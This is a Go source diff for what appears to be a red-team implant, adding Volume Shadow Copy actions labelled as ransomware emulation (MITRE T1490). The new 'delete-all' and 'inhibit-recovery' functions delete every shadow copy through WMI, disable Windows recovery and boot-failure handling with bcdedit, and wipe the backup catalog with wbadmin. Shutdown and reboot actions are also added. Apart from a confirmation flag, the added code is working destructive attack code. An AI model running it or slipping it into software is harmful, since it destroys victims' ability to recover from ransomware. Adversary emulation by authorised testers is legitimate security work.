@@ -27,14 +27,6 @@ func (c *VSSCommand) Description() string {
 	return "Manage Volume Shadow Copies — list, create, delete, and extract files"
 }
 
-type vssArgs struct {
-	Action string `json:"action"`
-	Volume string `json:"volume"`
-	ID     string `json:"id"`
-	Source string `json:"source"`
-	Dest   string `json:"dest"`
-}
-
 func (c *VSSCommand) Execute(task structs.Task) structs.CommandResult {
 	var args vssArgs
 
@@ -55,8 +47,16 @@ func (c *VSSCommand) Execute(task structs.Task) structs.CommandResult {
 		return vssDelete(args)
 	case "extract":
 		return vssExtract(args)
+	case "delete-all":
+		return vssDeleteAll(args)
+	case "inhibit-recovery":
+		return vssInhibitRecovery(args)
+	case "shutdown":
+		return vssShutdownWindows(args)
+	case "reboot":
+		return vssRebootWindows(args)
 	default:
-		return errorf("Unknown action: %s\nAvailable: list, create, delete, extract", args.Action)
+		return errorf("Unknown action: %s\nAvailable: list, create, delete, delete-all, extract, inhibit-recovery, shutdown, reboot", args.Action)
 	}
 }
 
@@ -280,7 +280,7 @@ func vssDelete(args vssArgs) structs.CommandResult {
 		_, err := oleutil.CallMethod(item, "Delete_")
 		if err != nil {
 			deleteErr = err
-			return err
+			return fmt.Errorf("deleting shadow copy: %w", err)
 		}
 		deleted = true
 		return nil
@@ -340,4 +340,129 @@ func vssExtract(args vssArgs) structs.CommandResult {
 	}
 
 	return successf("Extracted from shadow copy:\n  Source: %s\n  Dest: %s\n  Size: %d bytes", sourcePath, args.Dest, bytesCopied)
+}
+
+// vssDeleteAll deletes ALL shadow copies on the system.
+// MITRE ATT&CK: T1490 (Inhibit System Recovery)
+// This emulates ransomware behavior — requires explicit confirmation.
+func vssDeleteAll(args vssArgs) structs.CommandResult {
+	if !args.Confirm {
+		return errorResult("SAFETY: delete-all requires -confirm true. This will delete ALL shadow copies on the system (T1490 - Inhibit System Recovery). This is a destructive, irreversible action used in ransomware emulation.")
+	}
+
+	_, services, cleanup, err := vssWMIConnect()
+	if err != nil {
+		return errorf("Error connecting to WMI: %v", err)
+	}
+	defer cleanup()
+
+	resultSet, err := oleutil.CallMethod(services, "ExecQuery",
+		"SELECT * FROM Win32_ShadowCopy")
+	if err != nil {
+		return errorf("Error querying shadow copies: %v", err)
+	}
+	defer resultSet.Clear()
+
+	resultDisp := resultSet.ToIDispatch()
+	var deleted, failed int
+	var sb strings.Builder
+	sb.WriteString("Shadow Copy Deletion (T1490):\n\n")
+
+	_ = oleutil.ForEach(resultDisp, func(v *ole.VARIANT) error {
+		item := v.ToIDispatch()
+		idResult, _ := oleutil.GetProperty(item, "ID")
+		id := ""
+		if idResult != nil {
+			id = idResult.ToString()
+			idResult.Clear()
+		}
+
+		_, err := oleutil.CallMethod(item, "Delete_")
+		if err != nil {
+			sb.WriteString(fmt.Sprintf("  FAILED: %s — %v\n", id, err))
+			failed++
+		} else {
+			sb.WriteString(fmt.Sprintf("  DELETED: %s\n", id))
+			deleted++
+		}
+		return nil
+	})
+
+	sb.WriteString(fmt.Sprintf("\nResult: %d deleted, %d failed", deleted, failed))
+	if deleted == 0 && failed == 0 {
+		sb.WriteString(" (no shadow copies found)")
+	}
+
+	return successResult(sb.String())
+}
+
+// vssInhibitRecovery performs comprehensive system recovery inhibition.
+// MITRE ATT&CK: T1490 (Inhibit System Recovery)
+// Actions: delete all shadow copies, disable Windows Recovery, delete backup catalog.
+// Requires explicit confirmation due to destructive nature.
+func vssInhibitRecovery(args vssArgs) structs.CommandResult {
+	if !args.Confirm {
+		return errorResult("SAFETY: inhibit-recovery requires -confirm true. This will:\n  1. Delete ALL shadow copies\n  2. Disable Windows Recovery Environment\n  3. Delete backup catalog\n  4. Disable System Restore\nThis is a destructive, irreversible action used in ransomware emulation (T1490).")
+	}
+
+	var sb strings.Builder
+	sb.WriteString("Recovery Inhibition (T1490 — Inhibit System Recovery):\n\n")
+
+	// Step 1: Delete all shadow copies via WMI
+	sb.WriteString("[1] Shadow Copy Deletion:\n")
+	_, services, cleanup, err := vssWMIConnect()
+	if err != nil {
+		sb.WriteString(fmt.Sprintf("  ERROR: %v\n", err))
+	} else {
+		resultSet, err := oleutil.CallMethod(services, "ExecQuery",
+			"SELECT * FROM Win32_ShadowCopy")
+		if err != nil {
+			sb.WriteString(fmt.Sprintf("  ERROR querying: %v\n", err))
+		} else {
+			resultDisp := resultSet.ToIDispatch()
+			var deleted int
+			_ = oleutil.ForEach(resultDisp, func(v *ole.VARIANT) error {
+				item := v.ToIDispatch()
+				_, delErr := oleutil.CallMethod(item, "Delete_")
+				if delErr == nil {
+					deleted++
+				}
+				return nil
+			})
+			resultSet.Clear()
+			sb.WriteString(fmt.Sprintf("  Deleted %d shadow copies\n", deleted))
+		}
+		cleanup()
+	}
+
+	// Step 2: Disable Windows Recovery Environment (bcdedit)
+	sb.WriteString("\n[2] Windows Recovery Environment:\n")
+	outBytes, err := execCmdTimeout("bcdedit", "/set", "{default}", "recoveryenabled", "No")
+	if err != nil {
+		sb.WriteString(fmt.Sprintf("  ERROR: %v\n", err))
+	} else {
+		sb.WriteString(fmt.Sprintf("  %s\n", strings.TrimSpace(string(outBytes))))
+	}
+
+	// Step 3: Disable boot status policy (ignore boot failures)
+	sb.WriteString("\n[3] Boot Status Policy:\n")
+	outBytes, err = execCmdTimeout("bcdedit", "/set", "{default}", "bootstatuspolicy", "ignoreallfailures")
+	if err != nil {
+		sb.WriteString(fmt.Sprintf("  ERROR: %v\n", err))
+	} else {
+		sb.WriteString(fmt.Sprintf("  %s\n", strings.TrimSpace(string(outBytes))))
+	}
+
+	// Step 4: Delete backup catalog
+	sb.WriteString("\n[4] Backup Catalog:\n")
+	outBytes, err = execCmdTimeout("wbadmin", "delete", "catalog", "-quiet")
+	if err != nil {
+		sb.WriteString(fmt.Sprintf("  ERROR: %v (wbadmin may not be available)\n", err))
+	} else {
+		sb.WriteString(fmt.Sprintf("  %s\n", strings.TrimSpace(string(outBytes))))
+	}
+
+	sb.WriteString("\nRecovery inhibition complete. System recovery options have been disabled.")
+
+	return successResult(sb.String())
 }
